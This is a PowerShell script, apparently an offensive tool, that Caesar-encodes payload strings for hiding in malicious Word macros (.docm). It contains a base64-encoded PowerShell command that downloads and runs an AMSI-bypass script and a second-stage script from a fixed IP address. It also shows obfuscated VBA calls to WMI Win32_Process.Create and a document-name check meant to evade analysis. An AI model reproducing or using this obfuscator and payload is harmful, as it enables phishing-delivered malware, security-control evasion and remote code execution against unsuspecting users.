$key = 14

#select one of payloads:
$payload = "powershell -exEc byPaSs -nop -eNc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQA5AC4AMQAwADEALwBhAG0AcwBpAGIAeQBwAGEAcwBzAC4AcABzADEAJwApACAAfAAgAEkARQBYADsAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQA5ADkALgAxADAAMQAvAHIAdQBuAG0AZQAzADIALgBwAHMAMQAnACkAIAB8ACAASQBFAFgA"
$payload = 'winmgmts:'
$payload = 'Win32_Process'
$payload = 'runmecaesar32.docm'
$payload = 'runmecaesar64.docm'

<# how to use the encoded code in VBA:
GetObject(winmgmts:).Get(Win32_Process).Create Fluid, Fuel, Pressure, Launch
GetObject(Sun("136122127126120126133132075")).Get(Sun("104122127068067112097131128116118132132")).Create Fluid, Fuel, Pressure, Launch


If ActiveDocument.Name <> runmecaesar64.docm Then ...
If ActiveDocument.Name <> Sun("131134127126118116114118132114131071069063117128116126") Then ...
#>

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + $key
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        #$thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        #$thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
        #$thischar
    }
}

#there is problem in VBA with strings longer than 1024. strip per 1000 to be safe to be able to use variable at the beginning of the line
if ($output.Length -ge 1000) {
    $varNames = @()
    for ($j=0;$j -le $output.Length;$j = $j + 1000) {
        $varName = 'var{0}' -f (Get-Random)
        $varNames += $varName
        if ($output.Length -gt $j+1000) {
            ('{0} = "{1}"' -f $varName,$output.Substring($j,1000))
            ''
        } else {
            ('{0} = "{1}"' -f $varName,$output.Substring($j,$output.Length-$j))
            ''
        }
    }
    ''
    ('Ready = {0}' -f ($varNames -join ' & '))
} else {
    ('Ready = "{0}"' -f $output)
}


